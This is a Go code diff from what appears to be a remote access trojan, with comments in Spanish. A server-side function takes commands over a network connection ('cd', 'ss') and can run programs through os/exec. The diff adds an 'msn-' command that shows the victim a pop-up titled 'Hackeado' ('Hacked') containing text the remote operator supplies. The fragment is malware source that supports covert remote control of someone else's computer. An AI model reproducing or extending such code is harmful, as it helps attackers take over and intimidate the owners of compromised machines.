@@ -20,6 +20,8 @@ import (
 	"os"
 	"os/exec"
 	"regexp"
+	sistema "server/ejecuciones/sys"
+	"strings"
 	"syscall"
 	"time"
 
@@ -185,9 +187,19 @@ func Cliente(cliente net.Conn) {
 	}
 	entrada := string(buffer[:n]) // trasformar el paquete en string
 
-	match, _ := regexp.Match("cd ", []byte(entrada))
-	if match { // logica de cd
+	// deteccion de comando cd
+	match_cd, _ := regexp.Match("cd ", []byte(entrada))
+
+	// deteccion de comando msn
+	match_msn, _ := regexp.Match("msn-", []byte(entrada))
+
+	if match_cd { // logica de cd
 		Cd(entrada, cliente)
+
+	} else if match_msn {
+		msg := strings.Split(entrada, "-")
+
+		sistema.MsgCartel("Hackeado", msg[1])
 
 	} else if entrada == "ss" { // logica de ss
 		ch_err := make(chan error)
